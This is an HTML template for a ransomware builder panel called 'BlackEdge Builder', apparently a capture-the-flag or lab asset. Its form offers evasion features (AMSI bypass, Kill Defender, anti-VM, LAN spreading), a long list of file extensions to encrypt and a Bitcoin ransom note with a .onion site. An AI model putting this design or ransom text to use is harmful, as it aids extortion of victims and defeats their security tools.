<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>BlackEdge Builder by REgregious™</title>
        <link rel="icon" href="/static/images/favicon.png" />
        <link rel="stylesheet" type="text/css" href="/static/css/nes-core.min.css" />
        <link rel="stylesheet" type="text/css" href="/static/css/bootstrap.min.css" />
        <link rel="stylesheet" type="text/css" href="/static/css/main.css" />
        <meta charset="utf-8">
    </head>
    <body>
        <div class="position-fixed bottom-0 end-0 p-3" style="z-index: 11">
          <div id="resp-msg" class="toast align-items-center text-white bg-primary border-0" role="alert" aria-live="assertive" aria-atomic="true">
              <div class="d-flex">
                <div class="toast-body" id="resp-msg-text">
                  Settings Saved Successfully!
                </div>
                <button type="button" class="btn-close btn-close-white me-2 m-auto" onclick="hideToast()" aria-label="Close"></button>
              </div>
            </div>
        </div>
        <div class="container mt-5">
            <form id="builder-form" onsubmit="return false;">
            <div class="row">
                <div class="col-lg-8">
                    <div class="nes-container is-section with-title">
                        <div class="nes-container is-section with-title">
                            <p class="title">
                                <span>Stub Features</span>
                            </p>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="checkbox" name="protect_process"/>
                                <label class="form-check-label" for="protect_process">Protect Process</label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="checkbox" name="random_assembly"/>
                                <label class="form-check-label" for="random_assembly">Random Assembly</label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="checkbox" name="amsi_bypass"/>
                                <label class="form-check-label" for="amsi_bypass">AMSI Bypass</label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="checkbox" name="delay"/>
                                <label class="form-check-label" for="delay">Delay</label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="checkbox" name="anti_vm"/>
                                <label class="form-check-label" for="anti_vm">Anti-VM</label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="checkbox" name="kill_defender"/>
                                <label class="form-check-label" for="Kill Defender">Kill Defender</label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="checkbox" name="lan_spreading"/>
                                <label class="form-check-label" for="lan_spreading">LAN Spreading</label>
                            </div>
                        </div>
                        <div class="nes-container is-section with-title">
                            <p class="title">
                                <span>Icon Settings</span>
                            </p>
                            <div class="row">
                                <div class="col-lg-2 text-center" id="ico-container">
                                    <img id="ico-preview" height="80px" width="80px" src="/static/images/burns.ico" />
                                </div>
                                <div class="col-lg-10">
                                    <input
                                        type="text"
                                        id="ico-src"
                                        name="ico_url"
                                        class="w-100 text-center"
                                        value="/static/images/burns.ico"
                                    />
                                </div>
                            </div>
                        </div>
                        <div class="nes-container is-section with-title">
                            <p class="title">
                                <span>Extensions Settings</span>
                            </p>
                            <p>Include:</p>
                            <textarea class="w-100" name="inclusion_list" rows="5">
jpg, jpeg, png, ods, xls, xlsx, csv, ics, vcf, 3dm, 3ds, max, bmp, dds, gif, psd, xcf, tga, thm, tif, tiff, yuv, ai, eps, ps, svg, dwg, dxf, gpx, kml, kmz, webp, 3g2, 3gp, aaf, asf, avchd, avi, drc, flv, m2v, m4p, m4v, mkv, mng, mov, mp2, mp4, mpe, mpeg, mpg, mpv, mxf, nsv, ogg, ogv, ogm, qt, rm, rmvb, roq, srt, svi, vob, webm, wmv, yuv, aac, aiff, ape, au, flac, gsm, it, m3u, m4a, mid, mod, mp3, mpa, pls, ra, s3m, sid, wav, wma, xm, 7z, a, apk, ar, bz2, cab, cpio, deb, dmg, egg, gz, iso, jar, lha, mar, pea, rar, rpm, s7z, shar, tar, tbz2, tgz, tlz, war, whl, xpi, zip, zipx, xz, pak, exe, msi, bat, crx, patch, html, js, html, htm, css, js, jsx, scss, php, java, ppt, odp, doc, docx, ebook, log, md, msg, odt, org, pages, pdf, rtf, rst, tex, txt
</textarea>
                            <p class="mt-3">Exclude:</p>
                            <input type="text" name="exclusion_list" class="w-100" value="" />
                            <p class="mt-3">Encrypted Extension:</p>
                            <input type="text" name="encrypted_ext" class="w-100" value=".htb" />
                        </div>
                        
                    </div>
                </div>
                <div class="col-lg-4">
                    <div class="nes-container is-section with-title">
                        <p class="title">
                            <span>Ransom Message</span>
                        </p>
                        <textarea class="w-100 text-center" name="ransom_message" rows="18">
Attention! all your important files were encrypted! To get your files back send 1337 USD worth in Bitcoins to the address below, visit the TOR website and submit your Unique Identifier Key.

You can purchase Bitcoins from the following websites:

https://localbitcoins.com
https://coinbase.com

BTC Address : [[ BTC_ADDRESS ]]

TOR Website : raascxoysz2kvblluinr4ubak5pluunduy7qqd.onion</textarea>
                    </div>
                    <div class="nes-container is-section with-title">
                        <p class="title">
                            <span>Payment</span>
                        </p>
                        <input type="text" name="btc_address" class="w-100 text-center" value="BTC ADDRESS" />
                    </div>
                    <div class="nes-container is-section with-title btn-container">
                        <p class="title">
                            <span>Finalize Build</span>
                        </p>
                        <button class="btn btn-light" id="restoreSettingsBtn">Restore Settings</button>
                        <button class="btn btn-light" id="saveSettingsBtn">Save Settings</button>
                        <button class="btn btn-light" id="buildStubBtn">Build The Stub</button>
                    </div>
                </div>
            </div>
            </form>
        </div>

        <script type="text/javascript" src="/static/js/jquery-3.6.0.min.js"></script>
        <script type="text/javascript" src="/static/js/bootstrap.bundle.min.js"></script>
        <script type="text/javascript" src="/static/js/main.js"></script>

    </body>
</html>
